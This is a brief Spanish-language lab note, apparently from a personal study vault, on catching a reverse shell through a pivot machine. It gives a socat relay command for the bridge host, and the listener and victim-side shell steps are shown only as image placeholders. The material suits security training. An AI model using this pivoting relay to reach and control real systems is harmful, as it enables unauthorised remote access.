Entorno
![[Pasted image 20240709112723.png]]

# Maquina atacante
![[Pasted image 20240709112748.png]]

# Maquina puente
![[Pasted image 20240709112805.png]]

# Maquina victima
![[Pasted image 20240709113127.png]]


# Obtención de la shell 
Una vez tenemos el laboratorio prepara lo primero que hacemos es crear el puente en la maquina intermedia
```
socat tcp-l:443,fork,reuseaddr tcp:192,168,0,14:443
```
![[Pasted image 20240709112910.png]]

Nos ponemos en escucha con nuestra maquina atacante
![[Pasted image 20240709113000.png]]

Y ejecutamos la shell en la maquina victima
![[Pasted image 20240709113032.png]]

Ahora al volver a la maquina atacante ya hemos obtenido la reverse shell
![[Pasted image 20240709113101.png]]